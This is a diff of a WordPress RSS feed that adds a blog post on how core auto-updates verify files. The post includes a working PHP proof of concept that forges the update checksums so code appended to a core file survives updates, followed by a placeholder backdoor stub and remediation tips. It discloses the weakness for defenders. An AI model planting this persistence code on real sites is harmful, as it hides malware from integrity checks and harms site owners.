@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/category/core/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Fri, 17 Jul 2020 20:39:33 +0000</lastBuildDate>
+	<lastBuildDate>Fri, 17 Jul 2020 22:28:38 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,106 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>WordPress updates from core and security</title>
+		<link>https://wpdeeply.com/wordpress-updates-from-core-and-security/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Fri, 17 Jul 2020 22:26:32 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=149</guid>
+
+					<description><![CDATA[WordPress is on the auto-updates train for everything lately and they do it for &#8220;security&#8221;. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&#160;update_core&#160;and that is the place where magic is happening. WP core is deciding via&#160;get_core_checksums&#160;what files need to [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<hr class="wp-block-separator"/>
+
+
+
+<p>WordPress is on the auto-updates train for everything lately and they do it for &#8220;security&#8221;. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&nbsp;<code>update_core</code>&nbsp;and that is the place where magic is happening. WP core is deciding via&nbsp;<code>get_core_checksums</code>&nbsp;what files need to be updated / rewritten and in this function we have this phone home call:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$http_url = 'http://api.wordpress.org/core/checksums/1.0/?' . http_build_query( compact( 'version', 'locale' ), null, '&amp;' );
+$url      = $http_url;
+...
+$response = wp_remote_get( $url, $options );
+</code></pre>
+
+
+
+<p>e.g. phoning home is extendable by any piece of software that is on the WP instance. This means that &#8220;security&#8221; perspective is possible only for bugs that are reported towards software vendor (core, plugin, theme), but for 0days, bypasses of the fix or already compromised sites this functionality practically means nothing. There are many another ways for piece of code to survive auto-updates, but here we are going to see / understand one easy, basic and effective.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#eli5-poc"></a>Eli5 PoC</h2>
+
+
+
+<p>In the&nbsp;<code>ABSPATH . WPINC . '/plugin.php'</code>&nbsp;or any another file included / required after, append the following code:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">if ( ! function_exists("weaver_phoning_home") &amp;&amp; function_exists("add_filter") ){
+    function weaver_phoning_home($response, $parsed_args, $url){
+        global $weaver_current_file;
+        if ( strpos($url, "api.wordpress.org/core/checksums") !== false ){
+            if ( ! is_wp_error( $response ) &amp;&amp; 200 == wp_remote_retrieve_response_code( $response ) ) {
+                if ( isset($response["body"]) ){
+                    $body = json_decode( trim($response["body"]), true );
+                    if ( is_array($body) &amp;&amp; isset($body['checksums']) &amp;&amp; is_array($body['checksums']) ) {
+                        $alter_response = false;
+                        foreach ( $body['checksums'] as $core_file => $md5checksum ){
+                            if ( strpos($weaver_current_file, $core_file) !== false ){
+                                $wmd5 = md5_file($weaver_current_file);
+                                if ( $md5checksum !== $wmd5 ){
+                                    $alter_response = true;
+                                    $body['checksums'][$core_file] = $wmd5;
+                                }
+                            }
+                        }
+                        if ($alter_response){
+                            $response["body"] = json_encode($body);
+                            return $response;
+                        }
+                    }
+                }
+            }
+        }
+        return $response;
+    }
+    $weaver_current_file = __FILE__;
+    add_filter('http_response', 'weaver_phoning_home', 1, 4);
+}
+//malware code below - any length, any logic
+if ( isset($_REQUEST["wppply"])){
+    exit("deeply");
+}
+</code></pre>
+
+
+
+<p>Hit the update / re-install button, the code will remain in the file, stealth from update mechanism.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#few-facts"></a>Few facts</h2>
+
+
+
+<ul><li>This technique will work for core / wp-cli auto-updates / updates / re-install and for every security solution that rely on those functions.</li><li>There are few more places in the WP core where effective meddling with received data is possible</li><li>Two another approaches for WP not detectable malware exists wich will be covered in the next period</li><li>With theme + plugin auto-updates, supply chain attacks will become extremely effective (theme + plugin ownership change)</li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#remediation"></a>Remediation</h2>
+
+
+
+<ul><li>Turn off auto-updates and don&#8217;t use update / re-install WP options in the name of security</li><li>Server executable files shouldn&#8217;t be writable for server</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress importer and attached file</title>
 		<link>https://wpdeeply.com/wordpress-importer-and-attached-file/</link>
 		
